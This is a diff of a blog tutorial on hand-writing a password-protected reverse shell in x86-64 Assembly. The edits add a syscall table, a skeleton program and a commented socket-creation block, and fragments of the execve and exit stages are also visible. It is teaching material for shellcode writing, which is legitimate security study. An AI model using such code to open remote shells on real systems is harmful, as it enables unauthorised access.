@@ -155,7 +155,7 @@ The code for the password protected reverse shell can be found [here](https://gi
 
 If you have not, by now, read the blogpost [here](https://j33r4ff3.github.io/blog/Creating-TCP-Bind-Shell-with-C_2/), I would encourage you to do so as it covers most of the Assembly concepts needed to understand this part of the process.
 
-Ok, so if you have started reading this then I assume syscalls, registers and The Stack already makes sense to you and we can carry on coding our reverse shell in Assembly. As you might have noticed, the reverse shell has fewer stages and fewer syscalls as well as one new syscall. Let's map out the syscall we will be using in Assembly
+Ok, so if you have started reading this then I assume syscalls, registers and The Stack already makes sense to you and we can carry on coding our reverse shell in Assembly. As you might have noticed, the reverse shell has fewer stages and fewer syscalls as well as one new syscall. Let's map out the syscall we will be using in Assembly:
 
 ```nasm
 read == 0
@@ -166,6 +166,9 @@ execve == 59
 exit == 60
 ```
 
+That is about all we require to start with our Assembly code, so let's put our skeleton program in place before we carry on.
+
+
 ```nasm
 global _start
 
@@ -173,12 +176,28 @@ section .text
 
 _start:
 
-        ; create socket
-        mov rax, 41
-        mov rdi, 2
-        mov rsi, 1
-        mov rdx, 0
-        syscall
+exit:
+```
+
+<h3>Stage 1 - Creating a socket</h3>
+
+```c
+sock = socket(AF_INET, SOCK_STREAM, 0);
+```
+
+Remember that we can use Python to easily find out the values, for AF_INET & SOCK_STREAM, that we need to pass in Assembly. Recall that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So let’s put together our first block of assembly code.
+
+```nasm
+mov rax, 41 ;Syscall number for socket
+mov rdi, 2 ;Value for AF_INET
+mov rsi, 1 ;Value for SOCK_STREAM
+mov rdx, 0 ;Third argument where we need to pass a 0
+syscall //Give the syscall instruction
+```
+
+Again, if the block of code above makes no sense to you then go and read the previous blogposts first.
+
+```nasm
 
         mov rdi, rax
 
@@ -244,7 +263,6 @@ _start:
         mov rax, 59
         syscall
 
-exit:
         xor rax, rax
         mov rax, 60
         syscall
